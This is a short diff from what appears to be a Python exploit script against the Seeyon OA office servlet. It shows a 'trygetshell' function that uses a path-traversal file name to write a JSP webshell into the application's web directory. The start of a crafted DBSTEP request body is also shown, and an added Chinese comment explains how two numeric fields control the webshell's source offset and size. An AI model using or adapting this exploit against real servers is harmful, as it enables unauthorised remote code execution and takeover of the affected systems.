@@ -43,6 +43,7 @@ def encode(origin_bytes):
 
 def trygetshell():
     file_name = encode('..\\..\\..\\ApacheJetspeed\\webapps\\seeyon\\shell.jsp')
+    # 参数355值控制写入源码时，从报文中什么地方读取，而666参数值控制了webshell源代码内容大小。可根据实际情况更改
     data = """DBSTEP V3.0     355             0               666             DBSTEP=OKMLlKlV\r
           OPTION=S3WYOSWLBSGr\r
           currentUserId=zUCTwigsziCAPLesw4gsw4oEwV66\r
